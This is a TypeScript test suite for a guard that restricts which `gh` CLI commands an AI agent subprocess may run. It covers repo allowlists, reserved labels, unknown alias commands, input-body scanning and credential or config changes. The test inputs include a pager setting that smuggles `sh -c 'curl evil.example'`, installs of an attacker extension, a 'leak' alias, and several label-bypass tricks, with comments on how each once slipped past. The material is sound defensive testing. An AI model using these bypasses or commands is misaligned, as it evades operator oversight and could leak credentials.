/**
 * Tests for gh_guard_decision.ts — the shared decision used by the agent-side
 * `gh` guard shim (Issue #3643).
 *
 * The worker's in-process controls (`write_repo_allowlist.ts`,
 * `worker_label_guard.ts`) only mediate `gh` calls made by the worker itself.
 * The agent subprocess runs unrestricted Bash with an inherited `GH_TOKEN`, so
 * its own `gh` writes never reached either control. These tests drive the
 * decision function that the shim re-enters for every agent `gh` invocation.
 *
 * WHAT-tests: each drives `evaluateGhCommand` with a real argument vector and
 * asserts on the verdict, never on how the verdict was reached.
 *
 * Uses Australian English throughout (behaviour, colour, organisation, etc.).
 */

import { assert, assertEquals } from "@std/assert";
import {
  evaluateGhCommand,
  extractLabelValues,
} from "../lib/gh_guard_decision.ts";
import {
  isWriteRepoAllowlistActive,
  listAllowedWriteRepos,
  resetWriteRepoAllowlist,
  seedWriteRepoAllowlist,
} from "../lib/write_repo_allowlist.ts";
import { processSeedIdleTasksCommand } from "../commands/process_seed_idle_tasks.ts";
import type { Logger, WorkerConfig } from "../types.ts";

/** Silent logger for the sweep-boundary case (Issue #3860). */
function guardTestLogger(): Logger {
  return {
    info: () => {},
    warn: () => {},
    error: () => {},
    debug: () => {},
    security: () => {},
    skipReason: () => {},
    timing: () => {},
    scanSummary: () => {},
    workerSummary: () => {},
  };
}

/** Context with the write-repo allowlist active for a single repo. */
const ACTIVE = {
  active: true,
  allowedRepos: ["stSoftwareAU/VibeCoder"],
} as const;

/** Context matching a run that never seeded the allowlist. */
const INACTIVE = { active: false, allowedRepos: [] } as const;

// ---------------------------------------------------------------------------
// Write-repo allowlist
// ---------------------------------------------------------------------------

Deno.test("gh-guard - refuses an off-allowlist cross-repo comment", () => {
  const decision = evaluateGhCommand(
    ["issue", "comment", "7", "-R", "other-owner/other-repo", "--body", "x"],
    ACTIVE,
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WRITE_REPO_BLOCKED");
  assert(decision.reason?.includes("other-owner/other-repo"));
});

Deno.test("gh-guard - allows a write to a repo on the allowlist (case-insensitive)", () => {
  const decision = evaluateGhCommand(
    ["issue", "comment", "7", "-R", "stsoftwareau/vibecoder", "--body", "x"],
    ACTIVE,
  );
  assertEquals(decision.allowed, true);
});

Deno.test("gh-guard - allows a cwd-repo write with no explicit repo", () => {
  const decision = evaluateGhCommand(
    ["issue", "comment", "7", "--body", "x"],
    ACTIVE,
  );
  assertEquals(decision.allowed, true);
});

Deno.test("gh-guard - never blocks reads, even cross-repo", () => {
  for (
    const args of [
      ["issue", "view", "7", "-R", "other-owner/other-repo"],
      ["issue", "list", "-R", "other-owner/other-repo", "--label", "work-on"],
      ["api", "repos/other-owner/other-repo/issues"],
    ]
  ) {
    const decision = evaluateGhCommand(args, ACTIVE);
    assertEquals(decision.allowed, true, `expected read allowed: ${args}`);
  }
});

Deno.test("gh-guard - allowlist is inert when the run has not seeded it", () => {
  const decision = evaluateGhCommand(
    ["issue", "comment", "7", "-R", "other-owner/other-repo", "--body", "x"],
    INACTIVE,
  );
  assertEquals(decision.allowed, true);
});

Deno.test("gh-guard - refuses an off-allowlist gh api mutation", () => {
  const decision = evaluateGhCommand(
    ["api", "-X", "POST", "repos/other-owner/other-repo/issues", "-f", "t=x"],
    ACTIVE,
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WRITE_REPO_BLOCKED");
});

// ---------------------------------------------------------------------------
// Reserved-label guard
// ---------------------------------------------------------------------------

Deno.test("gh-guard - refuses self-applying a reserved workflow label", () => {
  for (
    const args of [
      ["issue", "edit", "7", "--add-label", "top-priority"],
      ["issue", "edit", "7", "--add-label=work-on"],
      ["issue", "create", "--title", "t", "--body", "b", "-l", "best-model"],
      ["issue", "edit", "7", "--add-label", "security,question"],
      ["issue", "edit", "7", "--add-label", "Top-Priority"],
      [
        "api",
        "-X",
        "POST",
        "repos/stSoftwareAU/VibeCoder/issues/7/labels",
        "-f",
        "labels[]=planning",
      ],
    ]
  ) {
    const decision = evaluateGhCommand(args, ACTIVE);
    assertEquals(decision.allowed, false, `expected refusal: ${args}`);
    assertEquals(decision.marker, "WORKER_LABEL_REFUSED");
  }
});

Deno.test("gh-guard - reserved-label guard applies even when the allowlist is inert", () => {
  const decision = evaluateGhCommand(
    ["issue", "edit", "7", "--add-label", "top-priority"],
    INACTIVE,
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WORKER_LABEL_REFUSED");
});

Deno.test("gh-guard - allows the scan templates' content labels", () => {
  const decision = evaluateGhCommand(
    [
      "issue",
      "create",
      "-R",
      "stSoftwareAU/VibeCoder",
      "--title",
      "finding",
      "--body",
      "b",
      "--label",
      "security,severity:high,confidence:high",
    ],
    ACTIVE,
  );
  assertEquals(decision.allowed, true);
});

Deno.test("gh-guard - allows listing issues by a reserved label (read, not a write)", () => {
  const decision = evaluateGhCommand(
    ["issue", "list", "--label", "top-priority"],
    ACTIVE,
  );
  assertEquals(decision.allowed, true);
});

// ---------------------------------------------------------------------------
// Unrecognised root commands — the config-alias channel (Issue #3866)
// ---------------------------------------------------------------------------

Deno.test("gh-guard - refuses an unrecognised root command (config alias)", () => {
  for (
    const args of [
      ["leak"],
      ["leak", "--body", "secrets"],
      ["co"],
      ["issue-comment", "7"],
    ]
  ) {
    const decision = evaluateGhCommand(args, ACTIVE);
    assertEquals(decision.allowed, false, `expected refusal: ${args}`);
    assertEquals(decision.marker, "GH_UNKNOWN_COMMAND");
    assert(decision.reason?.includes(args[0] ?? ""));
  }
});

Deno.test("gh-guard - refuses an unrecognised root even when the allowlist is inert", () => {
  const decision = evaluateGhCommand(["leak", "--body", "x"], INACTIVE);
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_UNKNOWN_COMMAND");
});

Deno.test("gh-guard - allows every real gh root command it gates", () => {
  for (
    const args of [
      ["issue", "list"],
      ["pr", "view", "7"],
      ["api", "repos/stSoftwareAU/VibeCoder"],
      ["auth", "status"],
      ["label", "list"],
      ["release", "list"],
      ["run", "list"],
      ["search", "issues", "test"],
      ["cache", "list"],
      ["workflow", "list"],
      ["repo", "view"],
      ["status"],
      ["help"],
      ["version"],
      ["extension", "list"],
    ]
  ) {
    const decision = evaluateGhCommand(args, ACTIVE);
    assertEquals(decision.allowed, true, `expected allowed: ${args}`);
  }
});

Deno.test("gh-guard - allows a bare gh with no root command", () => {
  for (const args of [[], ["--version"], ["--help"]]) {
    const decision = evaluateGhCommand(args, ACTIVE);
    assertEquals(decision.allowed, true, `expected allowed: ${args}`);
  }
});

Deno.test("gh-guard - root recognition is exact: a case variant is not a gh command", () => {
  // `gh` matches its own commands case-sensitively, so `ISSUE` is a name a
  // config alias is free to claim — recognising roots case-insensitively
  // would reopen the channel this check closes.
  const decision = evaluateGhCommand(["ISSUE", "list"], ACTIVE);
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_UNKNOWN_COMMAND");
});

// ---------------------------------------------------------------------------
// Label extraction
// ---------------------------------------------------------------------------

Deno.test("gh-guard - extracts label values from every supported flag form", () => {
  assertEquals(
    extractLabelValues([
      "issue",
      "edit",
      "7",
      "--add-label",
      "a,b",
      "--label=c",
      "-l",
      "d",
      "-f",
      "labels[]=e",
      "--field=labels=f",
      "--body",
      "not-a-label",
    ]),
    ["a", "b", "c", "d", "e", "f"],
  );
});

Deno.test("gh-guard - extracts nothing when no label flag is present", () => {
  assertEquals(
    extractLabelValues(["issue", "comment", "7", "--body", "hello"]),
    [],
  );
});

// ---------------------------------------------------------------------------
// Agent boundary during a worker-side seeding sweep (Issue #3860)
//
// The worker-side sweep grants *itself* write access to another monitored
// repo. The agent subprocess must gain nothing: its allowlist is baked from
// the run's own `ctx.repo` at spawn time, and the sweep's grant is released
// before any agent could be spawned. These are the tripwires for the
// dangerous failure direction — the fix eroding the #3311 / #3643 boundary.
// ---------------------------------------------------------------------------

Deno.test("gh-guard - agent allowlist stays ctx.repo-only when a sweep is requested", async () => {
  try {
    // The standard pipeline seeds the claimed issue's own repo (issue_worker).
    seedWriteRepoAllowlist("stSoftwareAU/VibeCoder");
    const bakedAtSpawn = listAllowedWriteRepos();
    assertEquals(bakedAtSpawn, ["stsoftwareau/vibecoder"]);

    // The agent asks for the very sweep #3858 requested. It is still refused.
    const decision = evaluateGhCommand(
      [
        "issue",
        "create",
        "--repo",
        "stSoftwareAU/private-repo-14",
        "--title",
        "Idle task: security scan",
        "--body",
        "x",
      ],
      { active: isWriteRepoAllowlistActive(), allowedRepos: bakedAtSpawn },
    );
    assertEquals(decision.allowed, false);
    assertEquals(decision.marker, "WRITE_REPO_BLOCKED");
    assert(decision.reason?.includes("stSoftwareAU/private-repo-14"));

    // Running the worker-side sweep does not widen what a later spawn bakes.
    const result = await processSeedIdleTasksCommand.execute(
      {
        "repo": "stSoftwareAU/VibeCoder",
        "issue-number": 3858,
        "title": "seed-idle-tasks: stSoftwareAU/private-repo-14",
        "__testDeps": {
          runGhCommand: () => Promise.resolve(""),
          logger: guardTestLogger(),
          createWrappersFn: () =>
            Promise.resolve({
              ok: true,
              value: { created: ["security-scan"], skipped: [] },
            }),
        },
      },
      {
        repos: ["stSoftwareAU/VibeCoder", "stSoftwareAU/private-repo-14"],
      } as unknown as WorkerConfig,
    );
    assertEquals(result.success, true);
    assertEquals(
      isWriteRepoAllowlistActive(),
      false,
      "the sweep's cross-repo grant must not survive into a later spawn",
    );
    assertEquals(listAllowedWriteRepos(), []);
  } finally {
    resetWriteRepoAllowlist();
  }
});

// ---------------------------------------------------------------------------
// Unrecognised root commands — the config-alias channel (Issue #3866)
// ---------------------------------------------------------------------------

Deno.test("gh-guard - refuses a root command it does not recognise", () => {
  const decision = evaluateGhCommand(["leak-it", "1", "--body", "x"], ACTIVE);
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_UNKNOWN_COMMAND");
  assert(decision.reason?.includes("leak-it"));
});

Deno.test("gh-guard - refuses an unrecognised root even with the allowlist inert", () => {
  const decision = evaluateGhCommand(["leak-it"], INACTIVE);
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_UNKNOWN_COMMAND");
});

Deno.test("gh-guard - still allows every genuine gh root command", () => {
  for (
    const args of [
      ["issue", "view", "7"],
      ["pr", "list"],
      ["api", "repos/stSoftwareAU/VibeCoder/issues"],
      ["label", "list"],
      ["auth", "status"],
      ["search", "issues", "test"],
      ["repo", "view"],
      ["run", "list"],
      ["workflow", "list"],
      ["release", "list"],
      ["cache", "list"],
      ["ruleset", "list"],
      ["secret", "list"],
      ["variable", "list"],
      ["config", "get", "editor"],
      ["status"],
      ["help"],
      ["version"],
      // gh's own built-in command aliases.
      ["cs", "list"],
      ["ext", "list"],
      ["at", "verify", "artefact.tgz"],
    ]
  ) {
    const decision = evaluateGhCommand(args, ACTIVE);
    assertEquals(decision.allowed, true, `expected allowed: ${args}`);
  }
});

Deno.test("gh-guard - allows an invocation that names no command at all", () => {
  assertEquals(evaluateGhCommand([], ACTIVE).allowed, true);
  assertEquals(evaluateGhCommand(["--version"], ACTIVE).allowed, true);
});

// ---------------------------------------------------------------------------
// Issue #91 — scan a readable `--input <file>` body for reserved labels
//
// #90 fails closed on every `--input` body. #91 restores the legitimate case:
// when the argv names a readable file and the caller injects a reader, the
// decision reads and scans it. A reserved label anywhere in the body refuses
// with WORKER_LABEL_REFUSED (naming it); a clean body is allowed; anything the
// scanner cannot fully understand stays refused with GH_BODY_UNREADABLE.
//
// The reader is a fake `(path) => string`; because the decision uses the
// injected reader (never `Deno`), these tests double as the purity check —
// the module reaches the canned content only through the injected function.
// ---------------------------------------------------------------------------

/** Build a context whose `--input` reader returns a fixed body. */
function inputCtx(body: string) {
  return {
    active: true,
    allowedRepos: ["o/r"],
    readBodyFile: (_path: string) => body,
  } as const;
}

/** A context whose reader throws, standing in for an unreadable path. */
const UNREADABLE_INPUT_CTX = {
  active: true,
  allowedRepos: ["o/r"],
  readBodyFile: (path: string) => {
    throw new Deno.errors.NotFound(`no such file: ${path}`);
  },
} as const;

const LABELS_ENDPOINT = "repos/o/r/issues/1/labels";

Deno.test('gh-guard #91 - refuses a reserved label in {"labels":[...]}, naming it', () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx('{"labels":["top-priority"]}'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WORKER_LABEL_REFUSED");
  assert(decision.reason?.includes("top-priority"));
});

Deno.test("gh-guard #91 - refuses a reserved label in the {name} object shape", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx('{"labels":[{"name":"work-on"}]}'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WORKER_LABEL_REFUSED");
  assert(decision.reason?.includes("work-on"));
});

Deno.test("gh-guard #91 - refuses a reserved label in a bare top-level array", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx('["question"]'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WORKER_LABEL_REFUSED");
  assert(decision.reason?.includes("question"));
});

Deno.test("gh-guard #91 - reserved-label matching in a body is case-insensitive", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx('{"labels":["Top-Priority"]}'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WORKER_LABEL_REFUSED");
  assert(decision.reason?.includes("Top-Priority"));
});

Deno.test("gh-guard #91 - allows a body whose labels are all legitimate content labels", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx('{"labels":["confidence:high","security"]}'),
  );
  assertEquals(decision.allowed, true);
});

Deno.test("gh-guard #91 - allows an issue-create body that carries no labels field", () => {
  const decision = evaluateGhCommand(
    ["api", "repos/o/r/issues", "--input", "/tmp/body.json"],
    inputCtx('{"title":"x","body":"y"}'),
  );
  assertEquals(decision.allowed, true);
});

Deno.test("gh-guard #91 - a clean body still fails the write-repo allowlist for an off-list repo", () => {
  // Scanning the body clean does not exempt the mutation from the allowlist:
  // the endpoint names a repo not on the list, so it is still blocked.
  const decision = evaluateGhCommand(
    ["api", "repos/attacker/evil/issues/1/labels", "--input", "/tmp/body.json"],
    inputCtx('{"labels":["security"]}'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WRITE_REPO_BLOCKED");
});

Deno.test("gh-guard #91 - fails closed on an unreadable path", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/missing.json"],
    UNREADABLE_INPUT_CTX,
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_BODY_UNREADABLE");
});

Deno.test("gh-guard #91 - fails closed on --input - (stdin, no readable path)", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "-"],
    inputCtx('{"labels":["security"]}'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_BODY_UNREADABLE");
});

Deno.test("gh-guard #91 - fails closed on malformed JSON", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx("{not json"),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_BODY_UNREADABLE");
});

Deno.test("gh-guard #91 - fails closed on a labels field of an unrecognised shape", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx('{"labels":"top-priority"}'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_BODY_UNREADABLE");
});

Deno.test("gh-guard #91 - fails closed on an array element that is neither string nor {name}", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx('{"labels":[123]}'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_BODY_UNREADABLE");
});

Deno.test("gh-guard #91 - with no reader injected, still fails closed (the safe default)", () => {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    { active: true, allowedRepos: ["o/r"] },
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_BODY_UNREADABLE");
});

Deno.test("gh-guard #91 - an argv-visible reserved label still wins over a clean input body", () => {
  const decision = evaluateGhCommand(
    [
      "api",
      LABELS_ENDPOINT,
      "--input",
      "/tmp/body.json",
      "-f",
      "labels[]=work-on",
    ],
    inputCtx('{"labels":["security"]}'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WORKER_LABEL_REFUSED");
  assert(decision.reason?.includes("work-on"));
});

// ---------------------------------------------------------------------------
// Issue #195 — JSON `--input` labels must use the same trim the argv path
// already applies. GitHub's REST/GUI trim label names (cli/cli#11898), so
// `{"labels":[" work-on "]}` is a reserved-label bypass, not only a
// correctness wart. `scanBodyForForbiddenLabel` is unexported; these drive
// the public `evaluateGhCommand` surface.
// ---------------------------------------------------------------------------

/** Assert a `--input` body is refused as a reserved workflow label. */
function assertInputForbidden(body: string): void {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx(body),
  );
  assertEquals(decision.allowed, false, `expected refusal for body: ${body}`);
  assertEquals(decision.marker, "WORKER_LABEL_REFUSED");
  assert(decision.reason?.includes("work-on"));
}

/** Assert a `--input` body is allowed through the reserved-label check. */
function assertInputClean(body: string): void {
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx(body),
  );
  assertEquals(decision.allowed, true, `expected clean body: ${body}`);
}

Deno.test('gh-guard #195 - refuses a padded reserved label in {"labels":[" work-on "]}', () => {
  assertInputForbidden('{"labels":[" work-on "]}');
});

Deno.test("gh-guard #195 - refuses a padded reserved label in the {name} object shape", () => {
  // Escaped so JSON.parse yields a tab/newline-padded name, not invalid JSON.
  assertInputForbidden('{"labels":[{"name":"\\twork-on\\n"}]}');
});

Deno.test("gh-guard #195 - refuses a padded reserved label in a bare top-level array", () => {
  assertInputForbidden('[" work-on "]');
});

Deno.test("gh-guard #195 - tab, newline and mixed leading/trailing whitespace all normalise", () => {
  for (
    const body of [
      '{"labels":["\\twork-on"]}',
      '{"labels":["work-on\\n"]}',
      '{"labels":[" \\twork-on \\n"]}',
      '{"labels":["\\rwork-on\\r"]}',
    ]
  ) {
    assertInputForbidden(body);
  }
});

Deno.test("gh-guard #195 - a whitespace-only JSON label element is unreadable (fail closed)", () => {
  // Must not silently drop the empty element the way the argv path filters
  // comma-separated empties — dropping would change the fail-closed posture.
  const decision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx('{"labels":["   "]}'),
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_BODY_UNREADABLE");
});

Deno.test("gh-guard #195 - legitimate labels stay clean, including a padded content label", () => {
  assertInputClean('{"labels":["bug"]}');
  assertInputClean('{"labels":[" bug "]}');
});

Deno.test("gh-guard #195 - a body with no labels field stays clean", () => {
  const decision = evaluateGhCommand(
    ["api", "repos/o/r/issues", "--input", "/tmp/body.json"],
    inputCtx('{"title":"x","body":"y"}'),
  );
  assertEquals(decision.allowed, true);
});

Deno.test("gh-guard #195 - argv path still trims; JSON path matches it (parity)", () => {
  const argvDecision = evaluateGhCommand(
    ["issue", "edit", "7", "--add-label", " work-on "],
    ACTIVE,
  );
  assertEquals(argvDecision.allowed, false);
  assertEquals(argvDecision.marker, "WORKER_LABEL_REFUSED");
  assert(argvDecision.reason?.includes("work-on"));

  const jsonDecision = evaluateGhCommand(
    ["api", LABELS_ENDPOINT, "--input", "/tmp/body.json"],
    inputCtx('{"labels":[" work-on "]}'),
  );
  assertEquals(jsonDecision.allowed, false);
  assertEquals(jsonDecision.marker, "WORKER_LABEL_REFUSED");
  assert(jsonDecision.reason?.includes("work-on"));
});

// ---------------------------------------------------------------------------
// Issue #93 — a `@file`-sourced `-F`/`--field` value is unreadable
//
// `gh -F 'labels[]=@/tmp/l.txt'` reads the label names from a file, so the
// argv cannot show them. The classifier marks the body unreadable and the
// backstop refuses; `extractLabelValues` must not emit the literal `@path` as
// a label. `-f`/`--raw-field` do not expand `@`, so `@literal` there is a real
// label name (the asymmetry the issue calls out).
// ---------------------------------------------------------------------------

Deno.test("gh-guard #93 - refuses an @file -F label field (GH_BODY_UNREADABLE)", () => {
  const decision = evaluateGhCommand(
    ["api", "repos/o/r/issues/1/labels", "-F", "labels[]=@/tmp/l.txt"],
    { active: true, allowedRepos: ["o/r"] },
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_BODY_UNREADABLE");
});

Deno.test("gh-guard #93 - the --field=labels[]=@path equals form is refused too", () => {
  const decision = evaluateGhCommand(
    ["api", "repos/o/r/issues/1/labels", "--field=labels[]=@/tmp/l.txt"],
    { active: true, allowedRepos: ["o/r"] },
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_BODY_UNREADABLE");
});

Deno.test("gh-guard #93 - extractLabelValues emits no label for an @file -F value", () => {
  // Returning "@/tmp/l.txt" as a label would falsely look inspected.
  assertEquals(
    extractLabelValues(["-F", "labels[]=@/tmp/l.txt"]),
    [],
  );
});

Deno.test("gh-guard #93 - a raw-field -f @literal IS the literal label name (asymmetry)", () => {
  assertEquals(
    extractLabelValues(["-f", "labels[]=@literal"]),
    ["@literal"],
  );
});

Deno.test("gh-guard #93 - a plain -F label with no @ is extracted unchanged", () => {
  assertEquals(extractLabelValues(["-F", "labels[]=bug"]), ["bug"]);
});

Deno.test("gh-guard #93 - a plain -F label with no @ is allowed on an allowlisted repo", () => {
  const decision = evaluateGhCommand(
    ["api", "repos/o/r/issues/1/labels", "-F", "labels[]=bug"],
    { active: true, allowedRepos: ["o/r"] },
  );
  assertEquals(decision.allowed, true);
});

Deno.test("gh-guard #93 - a reserved label via a literal -f value is still refused", () => {
  // The @-asymmetry must not weaken the reserved-label check for literals.
  const decision = evaluateGhCommand(
    ["api", "repos/o/r/issues/1/labels", "-f", "labels[]=top-priority"],
    { active: true, allowedRepos: ["o/r"] },
  );
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "WORKER_LABEL_REFUSED");
  assert(decision.reason?.includes("top-priority"));
});

// ---------------------------------------------------------------------------
// Local gh state — credentials, config, aliases, extensions (Issue #187)
// ---------------------------------------------------------------------------

Deno.test("gh-guard #187 - refuses a credential login from the agent subprocess", () => {
  // The trigger from the issue: piping an attacker token into an interactive
  // login rewrote the pinned GH_CONFIG_DIR credential store, and the guard
  // classified it as a read because no `auth` verb is a GitHub mutation.
  const decision = evaluateGhCommand(["auth", "login", "--with-token"], ACTIVE);
  assertEquals(decision.allowed, false);
  assertEquals(decision.marker, "GH_LOCAL_STATE_REFUSED");
  assert(decision.reason?.includes("credential store"));
});

Deno.test("gh-guard #187 - refuses every credential-store verb, allowlist inert or not", () => {
  for (const verb of ["login", "logout", "switch", "refresh", "setup-git"]) {
    for (const ctx of [ACTIVE, INACTIVE]) {
      const decision = evaluateGhCommand(["auth", verb], ctx);
      assertEquals(decision.allowed, false, `expected refusal: auth ${verb}`);
      assertEquals(decision.marker, "GH_LOCAL_STATE_REFUSED");
    }
  }
});

Deno.test("gh-guard #187 - refuses config, alias and extension writes", () => {
  for (
    const args of [
      ["config", "set", "pager", "sh -c 'curl evil.example'"],
      ["config", "clear-cache"],
      ["alias", "set", "co", "pr checkout"],
      ["alias", "delete", "co"],
      ["alias", "import", "aliases.yml"],
      ["extension", "install", "attacker/gh-evil"],
      ["extension", "upgrade", "gh-evil"],
      ["extension", "remove", "gh-evil"],
      ["extension", "exec", "gh-evil"],
      // `gh`'s own built-in root aliases must not spell a way around it.
      ["ext", "install", "attacker/gh-evil"],
      ["extensions", "install", "attacker/gh-evil"],
    ]
  ) {
    const decision = evaluateGhCommand(args, INACTIVE);
    assertEquals(decision.allowed, false, `expected refusal: ${args}`);
    assertEquals(decision.marker, "GH_LOCAL_STATE_REFUSED");
  }
});

Deno.test("gh-guard #187 - a global flag before the root does not smuggle the verb past", () => {
  const decision = evaluateGhCommand(
    ["--repo", "o/r", "auth", "login"],
    ACTIVE,
  );
  assertEquals(decision.allowed, false);
});

Deno.test("gh-guard #187 - local gh reads stay allowed", () => {
  for (
    const args of [
      ["auth", "status"],
      ["config", "get", "git_protocol"],
      ["config", "list"],
      ["alias", "list"],
      ["extension", "list"],
    ]
  ) {
    const decision = evaluateGhCommand(args, ACTIVE);
    assertEquals(decision.allowed, true, `expected read allowed: ${args}`);
  }
});

Deno.test("gh-guard #187 - ordinary GitHub writes are unaffected", () => {
  const decision = evaluateGhCommand(
    ["issue", "comment", "7", "--body", "x"],
    ACTIVE,
  );
  assertEquals(decision.allowed, true);
});
